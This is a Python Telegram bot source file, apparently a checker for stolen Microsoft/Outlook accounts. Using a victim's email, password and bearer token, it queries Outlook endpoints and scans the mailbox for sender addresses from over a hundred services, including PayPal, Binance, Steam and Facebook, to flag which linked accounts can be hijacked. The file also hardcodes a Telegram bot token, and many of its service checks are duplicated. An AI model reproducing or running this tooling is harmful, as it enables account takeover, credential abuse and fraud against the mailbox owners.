import requests
import uuid
import os
from concurrent.futures import ThreadPoolExecutor
import telebot
from telebot import types
import time
from telebot.types import LabeledPrice
import threading
import json
import random
import datetime
from datetime import timedelta
from datetime import datetime
import string
import sys
TOKEN = '7869242019:AAEzKQiXNAXWWTUagZ-Nxa8dtrQCrUH3aZs'
ADMIN_ID = 5955963998  
bot = telebot.TeleBot(TOKEN)

# تعريف المتغيرات
a, b = 0, 0
valid_accounts = {
    'facebook': [],
    'instagram': [],
    'pubg': [],
    'tiktok': [],
    'twitter': [],
    'paypal': [],
    'binance': [],
    'netflix': [],
    'playstation': [],
    'supercell': [],
    'epicgames': [],
    'spotify': [],
    'rockstar': [],
    'xbox': [],
    'microsoft': [],
    'steam': [],
    'roblox': [],
    'ea_sports': [],
    'bitkub': []
}

# تعريف الدوال
def get_infoo(Email, Password, token, CID, chat_id) -> str:
    he = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{CID}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
    info_name = (r.get('names', []))
    info_Loca = (r.get('accounts', []))
    name = info_name[0]['displayName']
    Loca = info_Loca[0]['location']
    url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"    
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": f"{CID}",
        "x-req-source": "Mini",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{CID}",
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://outlook.live.com/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    rese = requests.post(url, headers=headers, data="").text
    V1 = 'ִ𓍼 ✅ ⌇ 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 . 𓍲' if 'security@facebookmail.com' in rese else None
    V2 = 'ִ𓍼 ✅ ⌇ 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 . 𓍲' if 'security@mail.instagram.com' in rese else None
    V3 = 'ִ𓍼 ✅ ⌇ 𝗣𝗨𝗕𝗚 . 𓍲' if "noreply@pubgmobile.com" in rese else None
    V4 = 'ִ𓍼 ✅ ⌇ 𝗞𝗼𝗻𝗮𝗺𝗶 . 𓍲' if 'nintendo-noreply@ccg.nintendo.com' in rese else None
    V5 = 'ִ𓍼 ✅ ⌇ 𝗧𝗶𝗸𝗧𝗼𝗸 . 𓍲' if 'register@account.tiktok.com' in rese else None
    V6 = 'ִ𓍼 ✅ ⌇ 𝗧𝘄𝗶𝘁𝘁𝗲𝗿 . 𓍲' if 'info@x.com' in rese else None
    V7 = 'ִ𓍼 ✅ ⌇ 𝗣𝗮𝘆𝗣𝗮𝗹 . 𓍲' if 'service@paypal.com.br' in rese else None
    V8 = 'ִ𓍼 ✅ ⌇ 𝗕𝗶𝗻𝗮𝗻𝗰𝗲 . 𓍲' if 'do-not-reply@ses.binance.com' in rese else None
    V9 = 'ִ𓍼 ✅ ⌇ 𝗡𝗲𝘁𝗙𝗹𝗶𝘅 . 𓍲' if 'info@account.netflix.com' in rese else None
    V10 = 'ִ𓍼 ✅ ⌇ 𝗣𝗹𝗮𝘆𝘀𝘁𝗮𝘁𝗶𝗼𝗻 . 𓍲' if 'reply@txn-email.playstation.com' in rese else None
    V11 = 'ִ𓍼 ✅ ⌇ 𝗦𝘂𝗽𝗲𝗿𝗰𝗲𝗹𝗹 . 𓍲' if 'noreply@id.supercell.com' in rese else None
    V12 = 'ִ𓍼 ✅ ⌇ 𝗘𝗽𝗶𝗰𝗚𝗮𝗺𝗲𝘀 . 𓍲' if 'help@acct.epicgames.com' in rese else None
    V13 = 'ִ𓍼 ✅ ⌇ 𝗦𝗽𝗼𝘁𝗶𝗳𝘆 . 𓍲' if 'no-reply@spotify.com' in rese else None
    V14 = 'ִ𓍼 ✅ ⌇ 𝗥𝗼𝗰𝗸𝘀𝘁𝗮𝗿 . 𓍲' if 'noreply@rockstargames.com' in rese else None
    V15 = 'ִ𓍼 ✅ ⌇ 𝗫𝗯𝗼𝘅 . 𓍲' if 'xboxreps@engage.xbox.com' in rese else None
    V16 = 'ִ𓍼 ✅ ⌇ 𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 . 𓍲' if 'account-security-noreply@accountprotection.microsoft.com' in rese else None
    V17 = 'ִ𓍼 ✅ ⌇ 𝗦𝘁𝗲𝗮𝗺 . 𓍲' if 'noreply@steampowered.com' in rese else None
    V18 = 'ִ𓍼 ✅ ⌇ 𝗥𝗼𝗯𝗹𝗼𝘅 . 𓍲' if 'accounts@roblox.com' in rese else None
    V19 = 'ִ𓍼 ✅ ⌇ 𝗘𝗔 𝘀𝗽𝗼𝗿𝘁𝘀 . 𓍲' if 'EA@e.ea.com' in rese else None
    V20 = 'ִ𓍼 ✅ ⌇ 𝗕𝗶𝘁𝗸𝘂𝗯 . 𓍲' if 'no-reply@bitkub.com' in rese else None
    V21 = 'ִ𓍼 ✅ ⌇ 𝗫𝗻𝘅𝘅 18+ . 𓍲' if 'donotreply@xnxx.com' in rese else None
    V22 = 'ִ𓍼 ✅ ⌇ 𝗣𝗼𝗿𝗻𝗵𝘂𝗯 18+ . 𓍲' if 'noreply@pornhub.com' in rese else None
    V23 = 'ִ𓍼 ✅ ⌇ 𝗙𝗿𝗲𝗲 𝗙𝗶𝗿𝗲 . 𓍲' if 'no-reply@ff.garena.com' in rese or 'support@ff.garena.com' in rese or 'noreply@freefire.com' in rese or 'info@ff.garena.com' in rese else None
    V24 = 'ִ𓍼 ✅ ⌇ 𝗚𝗮𝗿𝗲𝗻𝗮 . 𓍲' if 'no-reply@garena.com' in rese or 'support@garena.com' in rese or 'noreply@garena.com' in rese or 'info@garena.com' in rese else None
    V25 = 'ִ𓍼 ✅ ⌇ 𝗠𝗶𝗻𝗶𝗖𝗹𝗶𝗽 . 𓍲' if 'no-reply@miniclip.com' in rese or 'support@miniclip.com' in rese or 'noreply@miniclip.com' in rese or 'info@miniclip.com' in rese else None
    V26 = 'ִ𓍼 ✅ ⌇ 𝟴 𝗕𝗮𝗹𝗹 𝗣𝗼𝗼𝗹 . 𓍲' if 'no-reply@8ballpool.com' in rese or 'support@8ballpool.com' in rese or 'noreply@miniclip.com' in rese else None
    V27 = 'ִ𓍼 ✅ ⌇ 𝗙𝗼𝗿𝘁𝗻𝗶𝘁𝗲 . 𓍲' if 'no-reply@fortnite.com' in rese or 'support@fortnite.com' in rese or 'noreply@epicgames.com' in rese else None
    V28 = 'ִ𓍼 ✅ ⌇ 𝗟𝗲𝗮𝗴𝘂𝗲 𝗼𝗳 𝗟𝗲𝗴𝗲𝗻𝗱𝘀 . 𓍲' if 'no-reply@riotgames.com' in rese or 'support@riotgames.com' in rese else None
    V29 = 'ִ𓍼 ✅ ⌇ 𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 . 𓍲' if 'no-reply@mojang.com' in rese or 'support@mojang.com' in rese else None
    V30 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗹𝗹 𝗼𝗳 𝗗𝘂𝘁𝘆 . 𓍲' if 'noreply@activision.com' in rese or 'support@activision.com' in rese else None
    V31 = 'ִ𓍼 ✅ ⌇ 𝗚𝗲𝗻𝘀𝗵𝗶𝗻 𝗜𝗺𝗽𝗮𝗰𝘁 . 𓍲' if 'no-reply@mihoyo.com' in rese or 'support@mihoyo.com' in rese else None
    V32 = 'ִ𓍼 ✅ ⌇ 𝗔𝘀𝘀𝗮𝘀𝘀𝗶𝗻\'𝘀 𝗖𝗿𝗲𝗲𝗱 . 𓍲' if 'no-reply@ubisoft.com' in rese or 'support@ubisoft.com' in rese else None
    V33 = 'ִ𓍼 ✅ ⌇ 𝗥𝗮𝗶𝗻𝗯𝗼𝘄 𝗦𝗶𝘅 𝗦𝗶𝗲𝗴𝗲 . 𓍲' if 'no-reply@ubisoft.com' in rese or 'support@ubisoft.com' in rese else None
    V34 = 'ִ𓍼 ✅ ⌇ 𝗪𝗼𝗿𝗹𝗱 𝗼𝗳 𝗪𝗮𝗿𝗰𝗿𝗮𝗳𝘁 . 𓍲' if 'no-reply@blizzard.com' in rese or 'support@blizzard.com' in rese else None
    V35 = 'ִ𓍼 ✅ ⌇ 𝗢𝘃𝗲𝗿𝘄𝗮𝘁𝗰𝗵 . 𓍲' if 'no-reply@blizzard.com' in rese or 'support@blizzard.com' in rese else None
    V36 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝗮𝗯𝗹𝗼 . 𓍲' if 'no-reply@blizzard.com' in rese or 'support@blizzard.com' in rese else None
    V37 = 'ִ𓍼 ✅ ⌇ 𝗛𝗲𝗮𝗿𝘁𝗵𝘀𝘁𝗼𝗻𝗲 . 𓍲' if 'no-reply@blizzard.com' in rese or 'support@blizzard.com' in rese else None
    V38 = 'ִ𓍼 ✅ ⌇ 𝗔𝗽𝗲𝘅 𝗟𝗲𝗴𝗲𝗻𝗱𝘀 . 𓍲' if 'no-reply@ea.com' in rese or 'support@ea.com' in rese else None
    V39 = 'ִ𓍼 ✅ ⌇ 𝗖𝘀:𝗚𝗼 . 𓍲' if 'no-reply@valvesoftware.com' in rese or 'support@valvesoftware.com' in rese else None
    V40 = 'ִ𓍼 ✅ ⌇ 𝗗𝗲𝘀𝘁𝗶𝗻𝘆 𝟮 . 𓍲' if 'no-reply@bungie.com' in rese or 'support@bungie.com' in rese else None
    V41 = 'ִ𓍼 ✅ ⌇ 𝗦𝗲𝗹𝗱𝗲𝗻 𝗥𝗶𝗻𝗴 . 𓍲' if 'no-reply@fromsoftware.com' in rese or 'support@fromsoftware.com' in rese else None
    V42 = 'ִ𓍼 ✅ ⌇ 𝗧𝗵𝗲 𝗪𝗶𝘁𝗰𝗵𝗲𝗿 . 𓍲' if 'no-reply@cdprojektred.com' in rese or 'support@cdprojektred.com' in rese else None
    V43 = 'ִ𓍼 ✅ ⌇ 𝗚𝗼𝗼𝗴𝗹𝗲 . 𓍲' if 'no-reply@accounts.google.com' in rese or 'support@google.com' in rese else None
    V44 = 'ִ𓍼 ✅ ⌇ 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 . 𓍲' if 'no-reply@youtube.com' in rese or 'support@youtube.com' in rese else None
    V45 = 'ִ𓍼 ✅ ⌇ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 . 𓍲' if 'no-reply@whatsapp.com' in rese or 'support@whatsapp.com' in rese else None
    V46 = 'ִ𓍼 ✅ ⌇ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 . 𓍲' if 'no-reply@telegram.org' in rese or 'support@telegram.org' in rese else None
    V47 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 . 𓍲' if 'no-reply@discord.com' in rese or 'support@discord.com' in rese else None
    V48 = 'ִ𓍼 ✅ ⌇ 𝗥𝗲𝗱𝗱𝗶𝘁 . 𓍲' if 'no-reply@reddit.com' in rese or 'support@reddit.com' in rese else None
    V49 = 'ִ𓍼 ✅ ⌇ 𝗧𝘄𝗶𝘁𝗰𝗵 . 𓍲' if 'no-reply@twitch.tv' in rese or 'support@twitch.tv' in rese else None
    V50 = 'ִ𓍼 ✅ ⌇ 𝗚𝗶𝘁𝗛𝘂𝗯 . 𓍲' if 'noreply@github.com' in rese or 'support@github.com' in rese else None
    V51 = 'ִ𓍼 ✅ ⌇ 𝗗𝗿𝗼𝗽𝗯𝗼𝘅 . 𓍲' if 'no-reply@dropbox.com' in rese or 'support@dropbox.com' in rese else None
    V52 = 'ִ𓍼 ✅ ⌇ 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁 . 𓍲' if 'no-reply@snapchat.com' in rese or 'support@snapchat.com' in rese else None
    V53 = 'ִ𓍼 ✅ ⌇ 𝗧𝗶𝗻𝗱𝗲𝗿 . 𓍲' if 'no-reply@tinder.com' in rese or 'support@tinder.com' in rese else None
    V54 = 'ִ𓍼 ✅ ⌇ 𝗨𝗯𝗲𝗿 . 𓍲' if 'no-reply@uber.com' in rese or 'support@uber.com' in rese else None
    V55 = 'ִ𓍼 ✅ ⌇ 𝗔𝗶𝗿𝗯𝗻𝗯 . 𓍲' if 'no-reply@airbnb.com' in rese or 'support@airbnb.com' in rese else None
    V56 = 'ִ𓍼 ✅ ⌇ 𝗔𝗺𝗮𝘇𝗼𝗻 . 𓍲' if 'auto-confirm@amazon.com' in rese or 'support@amazon.com' in rese else None
    V57 = 'ִ𓍼 ✅ ⌇ 𝗔𝗹𝗶𝗘𝘅𝗽𝗿𝗲𝘀𝘀 . 𓍲' if 'no-reply@aliexpress.com' in rese or 'support@aliexpress.com' in rese else None
    V58 = 'ִ𓍼 ✅ ⌇ 𝗘𝗯𝗮𝘆 . 𓍲' if 'no-reply@ebay.com' in rese or 'support@ebay.com' in rese else None
    V59 = 'ִ𓍼 ✅ ⌇ 𝗟𝗶𝗻𝗸𝗲𝗱𝗜𝗻 . 𓍲' if 'no-reply@linkedin.com' in rese or 'support@linkedin.com' in rese else None
    V60 = 'ִ𓍼 ✅ ⌇ 𝗧𝘂𝗺𝗯𝗹𝗿 . 𓍲' if 'no-reply@tumblr.com' in rese or 'support@tumblr.com' in rese else None
    V61 = 'ִ𓍼 ✅ ⌇ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 . 𓍲' if 'no-reply@telegram.org' in rese or 'support@telegram.org' in rese else None
    V62 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 . 𓍲' if 'no-reply@discord.com' in rese or 'support@discord.com' in rese else None
    V63 = 'ִ𓍼 ✅ ⌇ 𝗥𝗲𝗱𝗱𝗶𝘁 . 𓍲' if 'no-reply@reddit.com' in rese or 'support@reddit.com' in rese else None
    V64 = 'ִ𓍼 ✅ ⌇ 𝗧𝘄𝗶𝘁𝗰𝗵 . 𓍲' if 'no-reply@twitch.tv' in rese or 'support@twitch.tv' in rese else None
    V65 = 'ִ𓍼 ✅ ⌇ 𝗚𝗶𝘁𝗛𝘂𝗯 . 𓍲' if 'noreply@github.com' in rese or 'support@github.com' in rese else None
    V66 = 'ִ𓍼 ✅ ⌇ 𝗗𝗿𝗼𝗽𝗯𝗼𝘅 . 𓍲' if 'no-reply@dropbox.com' in rese or 'support@dropbox.com' in rese else None
    V67 = 'ִ𓍼 ✅ ⌇ 𝗦𝗻𝗮𝗽𝗰𝗵𝗮𝘁 . 𓍲' if 'no-reply@snapchat.com' in rese or 'support@snapchat.com' in rese else None
    V68 = 'ִ𓍼 ✅ ⌇ 𝗧𝗶𝗻𝗱𝗲𝗿 . 𓍲' if 'no-reply@tinder.com' in rese or 'support@tinder.com' in rese else None
    V69 = 'ִ𓍼 ✅ ⌇ 𝗨𝗯𝗲𝗿 . 𓍲' if 'no-reply@uber.com' in rese or 'support@uber.com' in rese else None
    V70 = 'ִ𓍼 ✅ ⌇ 𝗔𝗶𝗿𝗯𝗻𝗯 . 𓍲' if 'no-reply@airbnb.com' in rese or 'support@airbnb.com' in rese else None
    V71 = 'ִ𓍼 ✅ ⌇ 𝗔𝗺𝗮𝘇𝗼𝗻 . 𓍲' if 'auto-confirm@amazon.com' in rese or 'support@amazon.com' in rese else None
    V72 = 'ִ𓍼 ✅ ⌇ 𝗔𝗹𝗶𝗘𝘅𝗽𝗿𝗲𝘀𝘀 . 𓍲' if 'no-reply@aliexpress.com' in rese or 'support@aliexpress.com' in rese else None
    V73 = 'ִ𓍼 ✅ ⌇ 𝗘𝗯𝗮𝘆 . 𓍲' if 'no-reply@ebay.com' in rese or 'support@ebay.com' in rese else None
    V74 = 'ִ𓍼 ✅ ⌇ 𝗟𝗶𝗻𝗸𝗲𝗱𝗜𝗻 . 𓍲' if 'no-reply@linkedin.com' in rese or 'support@linkedin.com' in rese else None
    V75 = 'ִ𓍼 ✅ ⌇ 𝗧𝘂𝗺𝗯𝗹𝗿 . 𓍲' if 'no-reply@tumblr.com' in rese or 'support@tumblr.com' in rese else None
    V76 = 'ִ𓍼 ✅ ⌇ 𝗣𝗶𝗻𝘁𝗲𝗿𝗲𝘀𝘁 . 𓍲' if 'no-reply@pinterest.com' in rese or 'support@pinterest.com' in rese else None
    V77 = 'ִ𓍼 ✅ ⌇ 𝗤𝗤 . 𓍲' if 'no-reply@qq.com' in rese or 'support@qq.com' in rese else None
    V78 = 'ִ𓍼 ✅ ⌇ 𝗪𝗲𝗖𝗵𝗮𝘁 . 𓍲' if 'no-reply@wechat.com' in rese or 'support@wechat.com' in rese else None
    V79 = 'ִ𓍼 ✅ ⌇ 𝗩𝗞 . 𓍲' if 'no-reply@vk.com' in rese or 'support@vk.com' in rese else None
    V80 = 'ִ𓍼 ✅ ⌇ 𝗢𝗗𝗻𝗼𝗸𝗹𝗮𝘀𝘀𝗻𝗶𝗸𝗶 . 𓍲' if 'no-reply@odnoklassniki.ru' in rese or 'support@odnoklassniki.ru' in rese else None
    V81 = 'ִ𓍼 ✅ ⌇ 𝗬𝗮𝗵𝗼𝗼 . 𓍲' if 'no-reply@yahoo.com' in rese or 'support@yahoo.com' in rese else None
    V82 = 'ִ𓍼 ✅ ⌇ 𝗢𝘂𝘁𝗹𝗼𝗼𝗸 . 𓍲' if 'no-reply@outlook.com' in rese or 'support@outlook.com' in rese else None
    V83 = 'ִ𓍼 ✅ ⌇ 𝗛𝗼𝘁𝗺𝗮𝗶𝗹 . 𓍲' if 'no-reply@hotmail.com' in rese or 'support@hotmail.com' in rese else None
    V84 = 'ִ𓍼 ✅ ⌇ 𝗚𝗺𝗮𝗶𝗹 . 𓍲' if 'no-reply@gmail.com' in rese or 'support@gmail.com' in rese else None
    V85 = 'ִ𓍼 ✅ ⌇ 𝗣𝗿𝗼𝘁𝗼𝗻𝗺𝗮𝗶𝗹 . 𓍲' if 'no-reply@protonmail.com' in rese or 'support@protonmail.com' in rese else None
    V86 = 'ִ𓍼 ✅ ⌇ 𝗭𝗼𝗼𝗺 . 𓍲' if 'no-reply@zoom.us' in rese or 'support@zoom.us' in rese else None
    V87 = 'ִ𓍼 ✅ ⌇ 𝗦𝗹𝗮𝗰𝗸 . 𓍲' if 'no-reply@slack.com' in rese or 'support@slack.com' in rese else None
    V88 = 'ִ𓍼 ✅ ⌇ 𝗧𝗿𝗲𝗹𝗹𝗼 . 𓍲' if 'no-reply@trello.com' in rese or 'support@trello.com' in rese else None
    V89 = 'ִ𓍼 ✅ ⌇ 𝗔𝘀𝗮𝗻𝗮 . 𓍲' if 'no-reply@asana.com' in rese or 'support@asana.com' in rese else None
    V90 = 'ִ𓍼 ✅ ⌇ 𝗡𝗼𝘁𝗶𝗼𝗻 . 𓍲' if 'no-reply@notion.so' in rese or 'support@notion.so' in rese else None
    V91 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗻𝘃𝗮 . 𓍲' if 'no-reply@canva.com' in rese or 'support@canva.com' in rese else None
    V92 = 'ִ𓍼 ✅ ⌇ 𝗙𝗶𝗴𝗺𝗮 . 𓍲' if 'no-reply@figma.com' in rese or 'support@figma.com' in rese else None
    V93 = 'ִ𓍼 ✅ ⌇ 𝗗𝗿𝗶𝗯𝗯𝗯𝗹𝗲 . 𓍲' if 'no-reply@dribbble.com' in rese or 'support@dribbble.com' in rese else None
    V94 = 'ִ𓍼 ✅ ⌇ 𝗕𝗲𝗵𝗮𝗻𝗰𝗲 . 𓍲' if 'no-reply@behance.net' in rese or 'support@behance.net' in rese else None
    V95 = 'ִ𓍼 ✅ ⌇ 𝗙𝗹𝗶𝗽𝗸𝗮𝗿𝘁 . 𓍲' if 'no-reply@flipkart.com' in rese or 'support@flipkart.com' in rese else None
    V96 = 'ִ𓍼 ✅ ⌇ 𝗦𝗵𝗼𝗽𝗲𝗲 . 𓍲' if 'no-reply@shopee.com' in rese or 'support@shopee.com' in rese else None
    V97 = 'ִ𓍼 ✅ ⌇ 𝗟𝗮𝘇𝗮𝗱𝗮 . 𓍲' if 'no-reply@lazada.com' in rese or 'support@lazada.com' in rese else None
    V98 = 'ִ𓍼 ✅ ⌇ 𝗔𝗹𝗶𝗯𝗮𝗯𝗮 . 𓍲' if 'no-reply@alibaba.com' in rese or 'support@alibaba.com' in rese else None
    V99 = 'ִ𓍼 ✅ ⌇ 𝗧𝗮𝗼𝗯𝗮𝗼 . 𓍲' if 'no-reply@taobao.com' in rese or 'support@taobao.com' in rese else None
    V100 = 'ִ𓍼 ✅ ⌇ 𝗝𝗗.𝗰𝗼𝗺 . 𓍲' if 'no-reply@jd.com' in rese or 'support@jd.com' in rese else None
    V101 = 'ִ𓍼 ✅ ⌇ 𝗪𝗶𝗸𝗶𝗽𝗲𝗱𝗶𝗮 . 𓍲' if 'no-reply@wikimedia.org' in rese or 'support@wikimedia.org' in rese else None
    V102 = 'ִ𓍼 ✅ ⌇ 𝗤𝘂𝗼𝗿𝗮 . 𓍲' if 'no-reply@quora.com' in rese or 'support@quora.com' in rese else None
    V103 = 'ִ𓍼 ✅ ⌇ 𝗠𝗲𝗱𝗶𝘂𝗺 . 𓍲' if 'no-reply@medium.com' in rese or 'support@medium.com' in rese else None
    V104 = 'ִ𓍼 ✅ ⌇ 𝗦𝘁𝗮𝗰𝗸 𝗢𝘃𝗲𝗿𝗳𝗹𝗼𝘄 . 𓍲' if 'no-reply@stackoverflow.com' in rese or 'support@stackoverflow.com' in rese else None
    V105 = 'ִ𓍼 ✅ ⌇ 𝗚𝗶𝘁𝗟𝗮𝗯 . 𓍲' if 'no-reply@gitlab.com' in rese or 'support@gitlab.com' in rese else None
    V106 = 'ִ𓍼 ✅ ⌇ 𝗕𝗶𝘁𝗯𝘂𝗰𝗸𝗲𝘁 . 𓍲' if 'no-reply@bitbucket.org' in rese or 'support@bitbucket.org' in rese else None
    V107 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝗴𝗶𝘁𝗮𝗹𝗢𝗰𝗲𝗮𝗻 . 𓍲' if 'no-reply@digitalocean.com' in rese or 'support@digitalocean.com' in rese else None
    V108 = 'ִ𓍼 ✅ ⌇ 𝗛𝗲𝗿𝗼𝗸𝘂 . 𓍲' if 'no-reply@heroku.com' in rese or 'support@heroku.com' in rese else None
    V109 = 'ִ𓍼 ✅ ⌇ 𝗔𝘄𝘀 . 𓍲' if 'no-reply@amazonaws.com' in rese or 'support@amazonaws.com' in rese else None
    V110 = 'ִ𓍼 ✅ ⌇ 𝗚𝗼𝗼𝗴𝗹𝗲 𝗖𝗹𝗼𝘂𝗱 . 𓍲' if 'no-reply@cloud.google.com' in rese or 'support@cloud.google.com' in rese else None
    V111 = 'ִ𓍼 ✅ ⌇ 𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 𝗔𝘇𝘂𝗿𝗲 . 𓍲' if 'no-reply@azure.com' in rese or 'support@azure.com' in rese else None
    V112 = 'ִ𓍼 ✅ ⌇ 𝗜𝗕𝗠 𝗖𝗹𝗼𝘂𝗱 . 𓍲' if 'no-reply@ibm.com' in rese or 'support@ibm.com' in rese else None
    V113 = 'ִ𓍼 ✅ ⌇ 𝗢𝗿𝗮𝗰𝗹𝗲 𝗖𝗹𝗼𝘂𝗱 . 𓍲' if 'no-reply@oracle.com' in rese or 'support@oracle.com' in rese else None
    V114 = 'ִ𓍼 ✅ ⌇ 𝗦𝗮𝗹𝗲𝘀𝗳𝗼𝗿𝗰𝗲 . 𓍲' if 'no-reply@salesforce.com' in rese or 'support@salesforce.com' in rese else None
    V115 = 'ִ𓍼 ✅ ⌇ 𝗦𝗮𝗽 . 𓍲' if 'no-reply@sap.com' in rese or 'support@sap.com' in rese else None
    V116 = 'ִ𓍼 ✅ ⌇ 𝗔𝗱𝗼𝗯𝗲 . 𓍲' if 'no-reply@adobe.com' in rese or 'support@adobe.com' in rese else None
    V117 = 'ִ𓍼 ✅ ⌇ 𝗔𝘂𝘁𝗼𝗱𝗲𝘀𝗸 . 𓍲' if 'no-reply@autodesk.com' in rese or 'support@autodesk.com' in rese else None
    V118 = 'ִ𓍼 ✅ ⌇ 𝗖𝗮𝗻𝗼𝗻 . 𓍲' if 'no-reply@canon.com' in rese or 'support@canon.com' in rese else None
    V119 = 'ִ𓍼 ✅ ⌇ 𝗦𝗼𝗻𝘆 . 𓍲' if 'no-reply@sony.com' in rese or 'support@sony.com' in rese else None
    V120 = 'ִ𓍼 ✅ ⌇ 𝗟𝗚 . 𓍲' if 'no-reply@lg.com' in rese or 'support@lg.com' in rese else None
    V121 = 'ִ𓍼 ✅ ⌇ 𝗦𝗮𝗺𝘀𝘂𝗻𝗴 . 𓍲' if 'no-reply@samsung.com' in rese or 'support@samsung.com' in rese else None
    V122 = 'ִ𓍼 ✅ ⌇ 𝗔𝗽𝗽𝗹𝗲 𝗠𝘂𝘀𝗶𝗰 . 𓍲' if 'no-reply@music.apple.com' in rese or 'support@music.apple.com' in rese else None
    V123 = 'ִ𓍼 ✅ ⌇ 𝗦𝗽𝗼𝘁𝗶𝗳𝘆 𝗳𝗼𝗿 𝗔𝗿𝘁𝗶𝘀𝘁𝘀 . 𓍲' if 'no-reply@artists.spotify.com' in rese or 'support@artists.spotify.com' in rese else None
    V124 = 'ִ𓍼 ✅ ⌇ 𝗦𝗼𝘂𝗻𝗱𝗖𝗹𝗼𝘂𝗱 . 𓍲' if 'no-reply@soundcloud.com' in rese or 'support@soundcloud.com' in rese else None
    V125 = 'ִ𓍼 ✅ ⌇ 𝗕𝗮𝗻𝗱𝗰𝗮𝗺𝗽 . 𓍲' if 'no-reply@bandcamp.com' in rese or 'support@bandcamp.com' in rese else None
    V126 = 'ִ𓍼 ✅ ⌇ 𝗗𝗲𝘇𝗲𝗿 . 𓍲' if 'no-reply@deezer.com' in rese or 'support@deezer.com' in rese else None
    V127 = 'ִ𓍼 ✅ ⌇ 𝗧𝗶𝗱𝗮𝗹 . 𓍲' if 'no-reply@tidal.com' in rese or 'support@tidal.com' in rese else None
    V128 = 'ִ𓍼 ✅ ⌇ 𝗣𝗮𝗻𝗱𝗼𝗿𝗮 . 𓍲' if 'no-reply@pandora.com' in rese or 'support@pandora.com' in rese else None
    V129 = 'ִ𓍼 ✅ ⌇ 𝗔𝗽𝗽𝗹𝗲 𝗧𝗩 . 𓍲' if 'no-reply@tv.apple.com' in rese or 'support@tv.apple.com' in rese else None
    V130 = 'ִ𓍼 ✅ ⌇ 𝗡𝗲𝘁𝗳𝗹𝗶𝘅 𝗳𝗼𝗿 𝗣𝗮𝗿𝘁𝗻𝗲𝗿𝘀 . 𓍲' if 'no-reply@partners.netflix.com' in rese or 'support@partners.netflix.com' in rese else None
    V131 = 'ִ𓍼 ✅ ⌇ 𝗛𝘂𝗹𝘂 . 𓍲' if 'no-reply@hulu.com' in rese or 'support@hulu.com' in rese else None
    V132 = 'ִ𓍼 ✅ ⌇ 𝗗𝗶𝘀𝗻𝗲𝘆+ . 𓍲' if 'no-reply@disneyplus.com' in rese or 'support@disneyplus.com' in rese else None
    V133 = 'ִ𓍼 ✅ ⌇ 𝗛𝗕𝗢 𝗠𝗮𝘅 . 𓍲' if 'no-reply@hbomax.com' in rese or 'support@hbomax.com' in rese else None
    V134 = 'ִ𓍼 ✅ ⌇ 𝗣𝗿𝗶𝗺𝗲 𝗩𝗶𝗱𝗲𝗼 . 𓍲' if 'no-reply@primevideo.com' in rese or 'support@primevideo.com' in rese else None
    V135 = 'ִ𓍼 ✅ ⌇ 𝗖𝗿𝘂𝗻𝗰𝗵𝘆𝗿𝗼𝗹𝗹 . 𓍲' if 'no-reply@crunchyroll.com' in rese or 'support@crunchyroll.com' in rese else None
    V136 = 'ִ𓍼 ✅ ⌇ 𝗙𝘂𝗻𝗶𝗺𝗮𝘁𝗶𝗼𝗻 . 𓍲' if 'no-reply@funimation.com' in rese or 'support@funimation.com' in rese else None
    V137 = 'ִ𓍼 ✅ ⌇ 𝗩𝗶𝘂 . 𓍲' if 'no-reply@viu.com' in rese or 'support@viu.com' in rese else None
    V138 = 'ִ𓍼 ✅ ⌇ 𝗧𝗲𝗻𝗰𝗲𝗻𝘁 𝗩𝗶𝗱𝗲𝗼 . 𓍲' if 'no-reply@video.tencent.com' in rese or 'support@video.tencent.com' in rese else None
    V139 = 'ִ𓍼 ✅ ⌇ 𝗜𝗤𝗜𝗬𝗜 . 𓍲' if 'no-reply@iq.com' in rese or 'support@iq.com' in rese else None
    V140 = 'ִ𓍼 ✅ ⌇ 𝗬𝗼𝘂𝗸𝘂 . 𓍲' if 'no-reply@youku.com' in rese or 'support@youku.com' in rese else None
    V141 = 'ִ𓍼 ✅ ⌇ 𝗖𝗹𝗮𝘀𝗵 𝗥𝗼𝘆𝗮𝗹𝗲 . 𓍲' if 'noreply@supercell.com' in rese or 'support@supercell.com' in rese else None
    V142 = 'ִ𓍼 ✅ ⌇ 𝗕𝗿𝗮𝘄𝗹 𝗦𝘁𝗮𝗿𝘀 . 𓍲' if 'noreply@supercell.com' in rese or 'support@supercell.com' in rese else None
